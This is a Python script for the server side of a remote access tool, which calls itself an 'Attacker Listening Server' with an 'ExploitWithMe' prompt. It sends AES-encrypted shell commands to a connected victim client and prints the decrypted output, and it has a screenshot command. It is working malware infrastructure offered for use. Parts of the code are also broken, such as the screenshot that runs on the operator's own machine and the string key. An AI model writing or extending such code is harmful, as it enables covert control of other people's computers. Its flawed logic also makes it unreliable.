import os
import socket
import sys
from Crypto import Random
from Crypto.Cipher import AES
import pyscreenshot as ImageGrab

# Configuration
HOST = 'localhost'
PORT = 829
KEY = '82e672ae054aa4de6f042c888111686a'

# Function to pad plaintext
def pad(s):
    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)

# Function to encrypt plaintext
def encrypt(plaintext):
    plaintext = pad(plaintext)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

# Function to decrypt ciphertext
def decrypt(ciphertext):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b'\0')

# Function to take a screenshot
def screen_shot():
    try:
        os.system("pip install pyscreenshot")
        import pyscreenshot as ImageGrab
        im = ImageGrab.grab()
        im.show()
        im = ImageGrab.grab(bbox=(10, 10, 500, 500))
        im.show()
        ImageGrab.grab_to_file('im.png')
    except Exception as e:
        print("Error occurred while taking screenshot:", e)

# Main function
def main():
    # Setup server socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(10)
    print('Attacker Listening Server Started on Port {}...'.format(PORT))

    # Accept incoming connections
    conn, _ = s.accept()

    # Main loop for handling commands
    while True:
        # Prompt for command
        cmd = input('ExploitWithMe >> ').rstrip()

        # Check for special command to capture a screenshot
        if cmd == 'grab_screen':
            screen_shot()
            os.system("cat im.png")

        # Check for termination command
        elif cmd == '':
            continue

        # Encrypt and send command to the client
        conn.send(encrypt(cmd))

        # Check if command is termination command
        if cmd == 'terminate':
            s.close()
            sys.exit(0)

        # Receive and decrypt response from the client
        data = conn.recv(4096)
        print(decrypt(data))

if __name__ == '__main__':
    main()
